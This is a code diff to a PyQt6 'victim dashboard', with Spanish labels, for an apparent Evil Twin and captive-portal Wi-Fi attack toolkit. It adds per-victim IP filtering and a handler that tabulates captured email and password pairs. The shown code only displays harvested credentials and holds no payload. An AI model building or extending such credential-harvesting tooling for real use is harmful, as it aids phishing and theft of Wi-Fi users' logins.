@@ -7,10 +7,17 @@ from PyQt6.QtCore import Qt, pyqtSlot
 from PyQt6.QtGui import QFont, QColor
 
 class DashboardDialog(QDialog):
-    def __init__(self, target_mac=None, parent=None):
+    def __init__(self, target_mac=None, parent=None, target_ip=None):
         super().__init__(parent)
         self.target_mac = target_mac
-        self.setWindowTitle("Dashboard Global" if not target_mac else f"Dashboard de Víctima: {target_mac}")
+        self.target_ip = target_ip
+        if target_ip:
+            _title = f"Dashboard de Víctima (Captive Portal): {target_ip}"
+        elif target_mac:
+            _title = f"Dashboard de Víctima: {target_mac}"
+        else:
+            _title = "Dashboard Global"
+        self.setWindowTitle(_title)
         self.setMinimumSize(950, 600)
         self.setStyleSheet("""
             QDialog { background: #0a0a0a; border: 2px solid #00aa44; border-radius: 8px; }
@@ -25,7 +32,8 @@ class DashboardDialog(QDialog):
 
         layout = QVBoxLayout(self)
 
-        title = f"MONITOREO TÁCTICO {'GLOBAL' if not target_mac else 'INDIVIDUAL (' + target_mac + ')'}"
+        _tag = target_ip or target_mac
+        title = f"MONITOREO TÁCTICO {'GLOBAL' if not _tag else 'INDIVIDUAL (' + _tag + ')'}"
         header = QLabel(title)
         header.setStyleSheet("font-size: 14pt; margin-bottom: 10px; color: #ff3366;")
         layout.addWidget(header, alignment=Qt.AlignmentFlag.AlignCenter)
@@ -104,6 +112,8 @@ class DashboardDialog(QDialog):
         # data es de tipo post_exploitation.sniffer.CapturedData
         if self.target_mac and self.target_mac.lower() != data.src_mac.lower():
             return
+        if self.target_ip and self.target_ip != data.source_ip:
+            return
 
         hora = data.timestamp
         mac = data.src_mac or data.source_ip
@@ -143,3 +153,27 @@ class DashboardDialog(QDialog):
             # Si hay credencial, cambiamos el foco a esta tab
             self.tabs.setCurrentIndex(1)
             self.cred_table.scrollToBottom()
+
+    def on_credential_captured(self, entry):
+        """Credencial capturada por el Captive Portal (dict con ip/host/
+        email/password), distinta del CapturedData del sniffer de Evil Twin."""
+        if self.target_ip and entry.get("ip", "") != self.target_ip:
+            return
+
+        row = self.cred_table.rowCount()
+        self.cred_table.insertRow(row)
+        self.cred_table.setItem(row, 0, QTableWidgetItem(entry.get("timestamp", "")))
+        self.cred_table.setItem(row, 1, QTableWidgetItem(entry.get("ip", "")))
+        self.cred_table.setItem(row, 2, QTableWidgetItem(entry.get("host", "portal")))
+
+        val_text = entry.get("email", "") + " / " + entry.get("password", "")
+        val_item = QTableWidgetItem(val_text)
+        val_item.setForeground(QColor("#ff0044"))
+        font = val_item.font()
+        font.setBold(True)
+        val_item.setFont(font)
+        self.cred_table.setItem(row, 3, val_item)
+        self.cred_table.setItem(row, 4, QTableWidgetItem(entry.get("host", "")))
+
+        self.tabs.setCurrentIndex(1)
+        self.cred_table.scrollToBottom()
